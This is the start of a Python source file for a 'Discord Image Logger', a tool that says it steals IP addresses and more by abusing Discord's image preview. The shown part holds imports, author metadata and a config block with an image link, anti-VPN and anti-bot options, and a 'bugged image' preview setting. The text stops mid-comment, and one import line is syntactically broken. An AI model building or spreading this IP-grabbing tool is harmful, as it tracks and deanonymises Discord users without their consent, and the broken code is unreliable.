from http.server import BaseHTTPRequestHandler
from urllib.parse import import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    
    "image": "https://www.google.com/imgres?q=python%20code%20immage&imgurl=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Fcommons%2Fb%2Fbc%2FPython_Code.png%3Futm_source%3Dcommons.wikimedia.org%26utm_campaign%3Dindex%26utm_content%3Doriginal&imgrefurl=https%3A%2F%2Fcommons.wikimedia.org%2Fwiki%2FFile%3APython_Code.png&docid=FpSSUHx5qoZTOM&tbnid=HmX1dyE7jdhG8M&vet=12ahUKEwiI1tOa4vKXAxXDgP0HHbIAKBIQnPAOegQIdhAA..i&w=732&h=832&hcb=2&ved=2ahUKEwiI1tOa4vKXAxXDgP0HHbIAKBIQnPAOegQIdhAA",
    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                   # 0 = No Anti-VPN
                   # 1 = Don't ping when a VPN is suspected
                   # 2 = Don't send an alert when a VPN is suspected
                   
    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
    
    "antiBot": 1, # Prevents bots from triggering the alert
                  # 0 = No Anti-Bot
                  # 1 = Don't ping when it's possibly a bot
                  # 2 = Don't ping when it's 100% a bot
                  # 3 = Don't send an alert
                  # 4 = Don't send ar
